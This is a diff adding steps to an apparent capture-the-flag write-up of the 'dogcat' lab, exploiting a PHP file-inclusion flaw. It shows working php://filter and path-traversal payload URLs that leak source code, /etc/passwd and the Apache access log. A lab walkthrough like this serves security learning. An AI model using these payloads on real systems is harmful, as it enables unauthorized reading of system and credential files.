@@ -296,58 +296,147 @@ Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds
 
 ```
 
+----
+
+```
+http://10.10.43.88/?view=dog
+```
+
+<img width="1917" height="655" alt="image" src="https://github.com/user-attachments/assets/de9e64ea-e606-4a96-8d69-e81751f4f0c4" />
+
+
+> ## try lfi
+
+```
+http://10.10.43.88/?view=php://filter/resource=dog 
+```
+
+<img width="900" height="443" alt="image" src="https://github.com/user-attachments/assets/5d43f016-5b46-4881-b14b-7372b63f581b" />
+
+```
+Warning: include(): unable to locate filter "resource=dog.php" in /var/www/html/index.php on line 24
+
+Warning: include(): Unable to create filter (resource=dog.php) in /var/www/html/index.php on line 24
+```
 
 
 
+> ### try
+
+```php
+http://10.10.43.88/?view=php://filter/convert.base64-encode/resource=dog
+```
+
+<img width="972" height="302" alt="image" src="https://github.com/user-attachments/assets/012c72c3-e20d-41bf-a3e2-a58bbbca9c90" />
 
 
+```
+PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K 
+```
+
+<img width="931" height="135" alt="image" src="https://github.com/user-attachments/assets/f68318ea-7e04-46ae-83d4-1568361a2980" />
+
+```php
+<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
+```
 
 
+> ## now try to see `index` main page
+
+```
+http://10.10.43.88/?view=php://filter/convert.base64-encode/resource=dog/../index
+```
 
 
+<img width="1663" height="457" alt="image" src="https://github.com/user-attachments/assets/ad23e102-07a5-42d7-a061-8e0cbcd47071" />
 
 
+```
+ Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== 
+```
+
+<img width="1226" height="734" alt="image" src="https://github.com/user-attachments/assets/b9ac2010-1e6b-435b-bb96-229c8ac1b7c6" />
 
 
+```php
+<head>
+    <title>dogcat</title>
+    <link rel="stylesheet" type="text/css" href="/style.css">
+</head>
+
+<body>
+    <h1>dogcat</h1>
+    <i>a gallery of various dogs or cats</i>
+
+    <div>
+        <h2>What would you like to see?</h2>
+        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
+        <?php
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
+            if(isset($_GET['view'])) {
+                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
+                    echo 'Here you go!';
+                    include $_GET['view'] . $ext;
+                } else {
+                    echo 'Sorry, only dogs or cats are allowed.';
+                }
+            }
+        ?>
+    </div>
+</body>
+
+</html>
+```
+
+> ## notice that **`$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';`**
+> that is mean we can choose the extension of file 
+
+> ## now let's try to read **`/etc/passwd`**
 
 
+```
+http://10.10.43.88/?view=dog/../../../../../../../../../etc/passwd&ext=
+```
+
+> note if you try ``http://10.10.43.88/?view=dog/../../../../../../../../../etc/passwd`` only the extension will be `passwd.php` and it will fail
 
 
+<img width="1197" height="510" alt="image" src="https://github.com/user-attachments/assets/9e10dbaf-21f5-49e8-96c9-43d8d8bb621f" />
+
+```ruby
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats
+Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
+```
 
 
+> ## try to access log file of website
+
+```
+http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=
+```
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<img width="1496" height="822" alt="image" src="https://github.com/user-attachments/assets/da6282b0-ab1b-4b68-9ebf-8ec4a4e61ab1" />
 
 
 
